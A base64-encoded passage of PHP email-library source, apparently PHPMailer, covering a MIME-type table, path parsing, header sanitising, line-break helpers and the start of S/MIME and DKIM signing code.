IGZpbGUgZXh0ZW5zaW9uLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGV4dCBGaWxlIGV4dGVuc2lvbgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nIE1JTUUgdHlwZSBvZiBmaWxlCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gX21pbWVfdHlwZXMoJGV4dCA9ICcnKQogICAgewogICAgICAgICRtaW1lcyA9IFsKICAgICAgICAgICAgJ3hsJyA9PiAnYXBwbGljYXRpb24vZXhjZWwnLAogICAgICAgICAgICAnanMnID0+ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JywKICAgICAgICAgICAgJ2hxeCcgPT4gJ2FwcGxpY2F0aW9uL21hYy1iaW5oZXg0MCcsCiAgICAgICAgICAgICdjcHQnID0+ICdhcHBsaWNhdGlvbi9tYWMtY29tcGFjdHBybycsCiAgICAgICAgICAgICdiaW4nID0+ICdhcHBsaWNhdGlvbi9tYWNiaW5hcnknLAogICAgICAgICAgICAnZG9jJyA9PiAnYXBwbGljYXRpb24vbXN3b3JkJywKICAgICAgICAgICAgJ3dvcmQnID0+ICdhcHBsaWNhdGlvbi9tc3dvcmQnLAogICAgICAgICAgICAneGxzeCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5zcHJlYWRzaGVldG1sLnNoZWV0JywKICAgICAgICAgICAgJ3hsdHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQuc3ByZWFkc2hlZXRtbC50ZW1wbGF0ZScsCiAgICAgICAgICAgICdwb3R4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnRlbXBsYXRlJywKICAgICAgICAgICAgJ3Bwc3gnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwuc2xpZGVzaG93JywKICAgICAgICAgICAgJ3BwdHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwucHJlc2VudGF0aW9uJywKICAgICAgICAgICAgJ3NsZHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwuc2xpZGUnLAogICAgICAgICAgICAnZG9jeCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC53b3JkcHJvY2Vzc2luZ21sLmRvY3VtZW50JywKICAgICAgICAgICAgJ2RvdHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQud29yZHByb2Nlc3NpbmdtbC50ZW1wbGF0ZScsCiAgICAgICAgICAgICd4bGFtJyA9PiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsLmFkZGluLm1hY3JvRW5hYmxlZC4xMicsCiAgICAgICAgICAgICd4bHNiJyA9PiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsLnNoZWV0LmJpbmFyeS5tYWNyb0VuYWJsZWQuMTInLAogICAgICAgICAgICAnY2xhc3MnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnZGxsJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgICAgICAgJ2RtcycgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdleGUnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnbGhhJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgICAgICAgJ2x6aCcgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdwc2QnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnc2VhJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgICAgICAgJ3NvJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgICAgICAgJ29kYScgPT4gJ2FwcGxpY2F0aW9uL29kYScsCiAgICAgICAgICAgICdwZGYnID0+ICdhcHBsaWNhdGlvbi9wZGYnLAogICAgICAgICAgICAnYWknID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywKICAgICAgICAgICAgJ2VwcycgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLAogICAgICAgICAgICAncHMnID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywKICAgICAgICAgICAgJ3NtaScgPT4gJ2FwcGxpY2F0aW9uL3NtaWwnLAogICAgICAgICAgICAnc21pbCcgPT4gJ2FwcGxpY2F0aW9uL3NtaWwnLAogICAgICAgICAgICAnbWlmJyA9PiAnYXBwbGljYXRpb24vdm5kLm1pZicsCiAgICAgICAgICAgICd4bHMnID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwnLAogICAgICAgICAgICAncHB0JyA9PiAnYXBwbGljYXRpb24vdm5kLm1zLXBvd2VycG9pbnQnLAogICAgICAgICAgICAnd2J4bWwnID0+ICdhcHBsaWNhdGlvbi92bmQud2FwLndieG1sJywKICAgICAgICAgICAgJ3dtbGMnID0+ICdhcHBsaWNhdGlvbi92bmQud2FwLndtbGMnLAogICAgICAgICAgICAnZGNyJyA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsCiAgICAgICAgICAgICdkaXInID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywKICAgICAgICAgICAgJ2R4cicgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAogICAgICAgICAgICAnZHZpJyA9PiAnYXBwbGljYXRpb24veC1kdmknLAogICAgICAgICAgICAnZ3RhcicgPT4gJ2FwcGxpY2F0aW9uL3gtZ3RhcicsCiAgICAgICAgICAgICdwaHAzJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwNCcgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgICAgICAgJ3BocCcgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgICAgICAgJ3BodG1sJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwcycgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwLXNvdXJjZScsCiAgICAgICAgICAgICdzd2YnID0+ICdhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCcsCiAgICAgICAgICAgICdzaXQnID0+ICdhcHBsaWNhdGlvbi94LXN0dWZmaXQnLAogICAgICAgICAgICAndGFyJyA9PiAnYXBwbGljYXRpb24veC10YXInLAogICAgICAgICAgICAndGd6JyA9PiAnYXBwbGljYXRpb24veC10YXInLAogICAgICAgICAgICAneGh0JyA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywKICAgICAgICAgICAgJ3hodG1sJyA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywKICAgICAgICAgICAgJ3ppcCcgPT4gJ2FwcGxpY2F0aW9uL3ppcCcsCiAgICAgICAgICAgICdtaWQnID0+ICdhdWRpby9taWRpJywKICAgICAgICAgICAgJ21pZGknID0+ICdhdWRpby9taWRpJywKICAgICAgICAgICAgJ21wMicgPT4gJ2F1ZGlvL21wZWcnLAogICAgICAgICAgICAnbXAzJyA9PiAnYXVkaW8vbXBlZycsCiAgICAgICAgICAgICdtNGEnID0+ICdhdWRpby9tcDQnLAogICAgICAgICAgICAnbXBnYScgPT4gJ2F1ZGlvL21wZWcnLAogICAgICAgICAgICAnYWlmJyA9PiAnYXVkaW8veC1haWZmJywKICAgICAgICAgICAgJ2FpZmMnID0+ICdhdWRpby94LWFpZmYnLAogICAgICAgICAgICAnYWlmZicgPT4gJ2F1ZGlvL3gtYWlmZicsCiAgICAgICAgICAgICdyYW0nID0+ICdhdWRpby94LXBuLXJlYWxhdWRpbycsCiAgICAgICAgICAgICdybScgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywKICAgICAgICAgICAgJ3JwbScgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvLXBsdWdpbicsCiAgICAgICAgICAgICdyYScgPT4gJ2F1ZGlvL3gtcmVhbGF1ZGlvJywKICAgICAgICAgICAgJ3dhdicgPT4gJ2F1ZGlvL3gtd2F2JywKICAgICAgICAgICAgJ21rYScgPT4gJ2F1ZGlvL3gtbWF0cm9za2EnLAogICAgICAgICAgICAnYm1wJyA9PiAnaW1hZ2UvYm1wJywKICAgICAgICAgICAgJ2dpZicgPT4gJ2ltYWdlL2dpZicsCiAgICAgICAgICAgICdqcGVnJyA9PiAnaW1hZ2UvanBlZycsCiAgICAgICAgICAgICdqcGUnID0+ICdpbWFnZS9qcGVnJywKICAgICAgICAgICAgJ2pwZycgPT4gJ2ltYWdlL2pwZWcnLAogICAgICAgICAgICAncG5nJyA9PiAnaW1hZ2UvcG5nJywKICAgICAgICAgICAgJ3RpZmYnID0+ICdpbWFnZS90aWZmJywKICAgICAgICAgICAgJ3RpZicgPT4gJ2ltYWdlL3RpZmYnLAogICAgICAgICAgICAnd2VicCcgPT4gJ2ltYWdlL3dlYnAnLAogICAgICAgICAgICAnYXZpZicgPT4gJ2ltYWdlL2F2aWYnLAogICAgICAgICAgICAnaGVpZicgPT4gJ2ltYWdlL2hlaWYnLAogICAgICAgICAgICAnaGVpZnMnID0+ICdpbWFnZS9oZWlmLXNlcXVlbmNlJywKICAgICAgICAgICAgJ2hlaWMnID0+ICdpbWFnZS9oZWljJywKICAgICAgICAgICAgJ2hlaWNzJyA9PiAnaW1hZ2UvaGVpYy1zZXF1ZW5jZScsCiAgICAgICAgICAgICdlbWwnID0+ICdtZXNzYWdlL3JmYzgyMicsCiAgICAgICAgICAgICdjc3MnID0+ICd0ZXh0L2NzcycsCiAgICAgICAgICAgICdodG1sJyA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ2h0bScgPT4gJ3RleHQvaHRtbCcsCiAgICAgICAgICAgICdzaHRtbCcgPT4gJ3RleHQvaHRtbCcsCiAgICAgICAgICAgICdsb2cnID0+ICd0ZXh0L3BsYWluJywKICAgICAgICAgICAgJ3RleHQnID0+ICd0ZXh0L3BsYWluJywKICAgICAgICAgICAgJ3R4dCcgPT4gJ3RleHQvcGxhaW4nLAogICAgICAgICAgICAncnR4JyA9PiAndGV4dC9yaWNodGV4dCcsCiAgICAgICAgICAgICdydGYnID0+ICd0ZXh0L3J0ZicsCiAgICAgICAgICAgICd2Y2YnID0+ICd0ZXh0L3ZjYXJkJywKICAgICAgICAgICAgJ3ZjYXJkJyA9PiAndGV4dC92Y2FyZCcsCiAgICAgICAgICAgICdpY3MnID0+ICd0ZXh0L2NhbGVuZGFyJywKICAgICAgICAgICAgJ3htbCcgPT4gJ3RleHQveG1sJywKICAgICAgICAgICAgJ3hzbCcgPT4gJ3RleHQveG1sJywKICAgICAgICAgICAgJ2NzdicgPT4gJ3RleHQvY3N2JywKICAgICAgICAgICAgJ3dtdicgPT4gJ3ZpZGVvL3gtbXMtd212JywKICAgICAgICAgICAgJ21wZWcnID0+ICd2aWRlby9tcGVnJywKICAgICAgICAgICAgJ21wZScgPT4gJ3ZpZGVvL21wZWcnLAogICAgICAgICAgICAnbXBnJyA9PiAndmlkZW8vbXBlZycsCiAgICAgICAgICAgICdtcDQnID0+ICd2aWRlby9tcDQnLAogICAgICAgICAgICAnbTR2JyA9PiAndmlkZW8vbXA0JywKICAgICAgICAgICAgJ21vdicgPT4gJ3ZpZGVvL3F1aWNrdGltZScsCiAgICAgICAgICAgICdxdCcgPT4gJ3ZpZGVvL3F1aWNrdGltZScsCiAgICAgICAgICAgICdydicgPT4gJ3ZpZGVvL3ZuZC5ybi1yZWFsdmlkZW8nLAogICAgICAgICAgICAnYXZpJyA9PiAndmlkZW8veC1tc3ZpZGVvJywKICAgICAgICAgICAgJ21vdmllJyA9PiAndmlkZW8veC1zZ2ktbW92aWUnLAogICAgICAgICAgICAnd2VibScgPT4gJ3ZpZGVvL3dlYm0nLAogICAgICAgICAgICAnbWt2JyA9PiAndmlkZW8veC1tYXRyb3NrYScsCiAgICAgICAgXTsKICAgICAgICAkZXh0ID0gc3RydG9sb3dlcigkZXh0KTsKICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygkZXh0LCAkbWltZXMpKSB7CiAgICAgICAgICAgIHJldHVybiAkbWltZXNbJGV4dF07CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSc7CiAgICB9CgogICAgLyoqCiAgICAgKiBNYXAgYSBmaWxlIG5hbWUgdG8gYSBNSU1FIHR5cGUuCiAgICAgKiBEZWZhdWx0cyB0byAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywgaS5lLi4gYXJiaXRyYXJ5IGJpbmFyeSBkYXRhLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lIEEgZmlsZSBuYW1lIG9yIGZ1bGwgcGF0aCwgZG9lcyBub3QgbmVlZCB0byBleGlzdCBhcyBhIGZpbGUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGZpbGVuYW1lVG9UeXBlKCRmaWxlbmFtZSkKICAgIHsKICAgICAgICAvL0luIGNhc2UgdGhlIHBhdGggaXMgYSBVUkwsIHN0cmlwIGFueSBxdWVyeSBzdHJpbmcgYmVmb3JlIGdldHRpbmcgZXh0ZW5zaW9uCiAgICAgICAgJHFwb3MgPSBzdHJwb3MoJGZpbGVuYW1lLCAnPycpOwogICAgICAgIGlmIChmYWxzZSAhPT0gJHFwb3MpIHsKICAgICAgICAgICAgJGZpbGVuYW1lID0gc3Vic3RyKCRmaWxlbmFtZSwgMCwgJHFwb3MpOwogICAgICAgIH0KICAgICAgICAkZXh0ID0gc3RhdGljOjptYl9wYXRoaW5mbygkZmlsZW5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTik7CgogICAgICAgIHJldHVybiBzdGF0aWM6Ol9taW1lX3R5cGVzKCRleHQpOwogICAgfQoKICAgIC8qKgogICAgICogTXVsdGktYnl0ZS1zYWZlIHBhdGhpbmZvIHJlcGxhY2VtZW50LgogICAgICogRHJvcC1pbiByZXBsYWNlbWVudCBmb3IgcGF0aGluZm8oKSwgYnV0IG11bHRpYnl0ZS0gYW5kIGNyb3NzLXBsYXRmb3JtLXNhZmUuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5wYXRoaW5mby5waHAjMTA3NDYxCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAgICAgJHBhdGggICAgQSBmaWxlbmFtZSBvciBwYXRoLCBkb2VzIG5vdCBuZWVkIHRvIGV4aXN0IGFzIGEgZmlsZQogICAgICogQHBhcmFtIGludHxzdHJpbmcgJG9wdGlvbnMgRWl0aGVyIGEgUEFUSElORk9fKiBjb25zdGFudCwKICAgICAqICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9yIGEgc3RyaW5nIG5hbWUgdG8gcmV0dXJuIG9ubHkgdGhlIHNwZWNpZmllZCBwaWVjZQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nfGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbWJfcGF0aGluZm8oJHBhdGgsICRvcHRpb25zID0gbnVsbCkKICAgIHsKICAgICAgICAkcmV0ID0gWydkaXJuYW1lJyA9PiAnJywgJ2Jhc2VuYW1lJyA9PiAnJywgJ2V4dGVuc2lvbicgPT4gJycsICdmaWxlbmFtZScgPT4gJyddOwogICAgICAgICRwYXRoaW5mbyA9IFtdOwogICAgICAgIGlmIChwcmVnX21hdGNoKCcjXiguKj8pW1xcXFwvXSooKFteL1xcXFxdKj8pKFwuKFteLlxcXFwvXSs/KXwpKVtcXFxcLy5dKiQjbScsICRwYXRoLCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDEsICRwYXRoaW5mbykpIHsKICAgICAgICAgICAgICAgICRyZXRbJ2Rpcm5hbWUnXSA9ICRwYXRoaW5mb1sxXTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygyLCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydiYXNlbmFtZSddID0gJHBhdGhpbmZvWzJdOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDUsICRwYXRoaW5mbykpIHsKICAgICAgICAgICAgICAgICRyZXRbJ2V4dGVuc2lvbiddID0gJHBhdGhpbmZvWzVdOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDMsICRwYXRoaW5mbykpIHsKICAgICAgICAgICAgICAgICRyZXRbJ2ZpbGVuYW1lJ10gPSAkcGF0aGluZm9bM107CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgc3dpdGNoICgkb3B0aW9ucykgewogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0RJUk5BTUU6CiAgICAgICAgICAgIGNhc2UgJ2Rpcm5hbWUnOgogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2Rpcm5hbWUnXTsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19CQVNFTkFNRToKICAgICAgICAgICAgY2FzZSAnYmFzZW5hbWUnOgogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2Jhc2VuYW1lJ107CiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fRVhURU5TSU9OOgogICAgICAgICAgICBjYXNlICdleHRlbnNpb24nOgogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2V4dGVuc2lvbiddOwogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0ZJTEVOQU1FOgogICAgICAgICAgICBjYXNlICdmaWxlbmFtZSc6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZmlsZW5hbWUnXTsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0OwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFNldCBvciByZXNldCBpbnN0YW5jZSBwcm9wZXJ0aWVzLgogICAgICogWW91IHNob3VsZCBhdm9pZCB0aGlzIGZ1bmN0aW9uIC0gaXQncyBtb3JlIHZlcmJvc2UsIGxlc3MgZWZmaWNpZW50LCBtb3JlIGVycm9yLXByb25lIGFuZAogICAgICogaGFyZGVyIHRvIGRlYnVnIHRoYW4gc2V0dGluZyBwcm9wZXJ0aWVzIGRpcmVjdGx5LgogICAgICogVXNhZ2UgRXhhbXBsZToKICAgICAqIGAkbWFpbC0+c2V0KCdTTVRQU2VjdXJlJywgc3RhdGljOjpFTkNSWVBUSU9OX1NUQVJUVExTKTtgCiAgICAgKiAgIGlzIHRoZSBzYW1lIGFzOgogICAgICogYCRtYWlsLT5TTVRQU2VjdXJlID0gc3RhdGljOjpFTkNSWVBUSU9OX1NUQVJUVExTO2AuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSAgVGhlIHByb3BlcnR5IG5hbWUgdG8gc2V0CiAgICAgKiBAcGFyYW0gbWl4ZWQgICR2YWx1ZSBUaGUgdmFsdWUgdG8gc2V0IHRoZSBwcm9wZXJ0eSB0bwogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0KCRuYW1lLCAkdmFsdWUgPSAnJykKICAgIHsKICAgICAgICBpZiAocHJvcGVydHlfZXhpc3RzKCR0aGlzLCAkbmFtZSkpIHsKICAgICAgICAgICAgJHRoaXMtPnskbmFtZX0gPSAkdmFsdWU7CgogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCd2YXJpYWJsZV9zZXQnKSAuICRuYW1lKTsKCiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogU3RyaXAgbmV3bGluZXMgdG8gcHJldmVudCBoZWFkZXIgaW5qZWN0aW9uLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZWN1cmVIZWFkZXIoJHN0cikKICAgIHsKICAgICAgICByZXR1cm4gdHJpbShzdHJfcmVwbGFjZShbIlxyIiwgIlxuIl0sICcnLCAkc3RyKSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBOb3JtYWxpemUgbGluZSBicmVha3MgaW4gYSBzdHJpbmcuCiAgICAgKiBDb252ZXJ0cyBVTklYIExGLCBNYWMgQ1IgYW5kIFdpbmRvd3MgQ1JMRiBsaW5lIGJyZWFrcyBpbnRvIGEgc2luZ2xlIGxpbmUgYnJlYWsgZm9ybWF0LgogICAgICogRGVmYXVsdHMgdG8gQ1JMRiAoZm9yIG1lc3NhZ2UgYm9kaWVzKSBhbmQgcHJlc2VydmVzIGNvbnNlY3V0aXZlIGJyZWFrcy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0ZXh0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRicmVha3R5cGUgV2hhdCBraW5kIG9mIGxpbmUgYnJlYWsgdG8gdXNlOyBkZWZhdWx0cyB0byBzdGF0aWM6OiRMRQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbm9ybWFsaXplQnJlYWtzKCR0ZXh0LCAkYnJlYWt0eXBlID0gbnVsbCkKICAgIHsKICAgICAgICBpZiAobnVsbCA9PT0gJGJyZWFrdHlwZSkgewogICAgICAgICAgICAkYnJlYWt0eXBlID0gc3RhdGljOjokTEU7CiAgICAgICAgfQogICAgICAgIC8vTm9ybWFsaXNlIHRvIFxuCiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZShbc2VsZjo6Q1JMRiwgIlxyIl0sICJcbiIsICR0ZXh0KTsKICAgICAgICAvL05vdyBjb252ZXJ0IExFIGFzIG5lZWRlZAogICAgICAgIGlmICgiXG4iICE9PSAkYnJlYWt0eXBlKSB7CiAgICAgICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlxuIiwgJGJyZWFrdHlwZSwgJHRleHQpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0ZXh0OwogICAgfQoKICAgIC8qKgogICAgICogUmVtb3ZlIHRyYWlsaW5nIHdoaXRlc3BhY2UgZnJvbSBhIHN0cmluZy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0ZXh0CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcgVGhlIHRleHQgdG8gcmVtb3ZlIHdoaXRlc3BhY2UgZnJvbQogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHN0cmlwVHJhaWxpbmdXU1AoJHRleHQpCiAgICB7CiAgICAgICAgcmV0dXJuIHJ0cmltKCR0ZXh0LCAiIFxyXG5cdCIpOwogICAgfQoKICAgIC8qKgogICAgICogU3RyaXAgdHJhaWxpbmcgbGluZSBicmVha3MgZnJvbSBhIHN0cmluZy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0ZXh0CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcgVGhlIHRleHQgdG8gcmVtb3ZlIGJyZWFrcyBmcm9tCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gc3RyaXBUcmFpbGluZ0JyZWFrcygkdGV4dCkKICAgIHsKICAgICAgICByZXR1cm4gcnRyaW0oJHRleHQsICJcclxuIik7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gdGhlIGN1cnJlbnQgbGluZSBicmVhayBmb3JtYXQgc3RyaW5nLgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gZ2V0TEUoKQogICAgewogICAgICAgIHJldHVybiBzdGF0aWM6OiRMRTsKICAgIH0KCiAgICAvKioKICAgICAqIFNldCB0aGUgbGluZSBicmVhayBmb3JtYXQgc3RyaW5nLCBlLmcuICJcclxuIi4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRsZQogICAgICovCiAgICBwcm90ZWN0ZWQgc3RhdGljIGZ1bmN0aW9uIHNldExFKCRsZSkKICAgIHsKICAgICAgICBzdGF0aWM6OiRMRSA9ICRsZTsKICAgIH0KCiAgICAvKioKICAgICAqIFNldCB0aGUgcHVibGljIGFuZCBwcml2YXRlIGtleSBmaWxlcyBhbmQgcGFzc3dvcmQgZm9yIFMvTUlNRSBzaWduaW5nLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNlcnRfZmlsZW5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtleV9maWxlbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAka2V5X3Bhc3MgICAgICAgICAgICBQYXNzd29yZCBmb3IgcHJpdmF0ZSBrZXkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGV4dHJhY2VydHNfZmlsZW5hbWUgT3B0aW9uYWwgcGF0aCB0byBjaGFpbiBjZXJ0aWZpY2F0ZQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2lnbigkY2VydF9maWxlbmFtZSwgJGtleV9maWxlbmFtZSwgJGtleV9wYXNzLCAkZXh0cmFjZXJ0c19maWxlbmFtZSA9ICcnKQogICAgewogICAgICAgICR0aGlzLT5zaWduX2NlcnRfZmlsZSA9ICRjZXJ0X2ZpbGVuYW1lOwogICAgICAgICR0aGlzLT5zaWduX2tleV9maWxlID0gJGtleV9maWxlbmFtZTsKICAgICAgICAkdGhpcy0+c2lnbl9rZXlfcGFzcyA9ICRrZXlfcGFzczsKICAgICAgICAkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUgPSAkZXh0cmFjZXJ0c19maWxlbmFtZTsKICAgIH0KCiAgICAvKioKICAgICAqIFF1b3RlZC1QcmludGFibGUtZW5jb2RlIGEgREtJTSBoZWFkZXIuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkdHh0CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fUVAoJHR4dCkKICAgIHsKICAgICAgICAkbGluZSA9ICcnOwogICAgICAgICRsZW4gPSBzdHJsZW4oJHR4dCk7CiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbjsgKyskaSkgewogICAgICAgICAgICAkb3JkID0gb3JkKCR0eHRbJGldKTsKICAgICAgICAgICAgaWYgKCgoMHgyMSA8PSAkb3JkKSAmJiAoJG9yZCA8PSAweDNBKSkgfHwgJG9yZCA9PT0gMHgzQyB8fCAoKDB4M0UgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHg3RSkpKSB7CiAgICAgICAgICAgICAgICAkbGluZSAuPSAkdHh0WyRpXTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRsaW5lIC49ICc9JyAuIHNwcmludGYoJyUwMlgnLCAkb3JkKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRsaW5lOwogICAgfQoKICAgIC8qKgogICAgICogR2VuZXJhdGUgYSBES0lNIHNpZ25hdHVyZS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzaWduSGVhZGVyCiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgREtJTSBzaWduYXR1cmUgdmFsdWUKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fU2lnbigkc2lnbkhlYWRlcikKICAgIHsKICAgICAgICBpZiAoIWRlZmluZWQoJ1BLQ1M3X1RFWFQnKSkgewogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykgLiAnb3BlbnNzbCcpOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgfQogICAgICAgICRwcml2S2V5U3RyID0gIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nKSA/CiAgICAgICAgICAgICR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nIDoKICAgICAgICAgICAgZmlsZV9n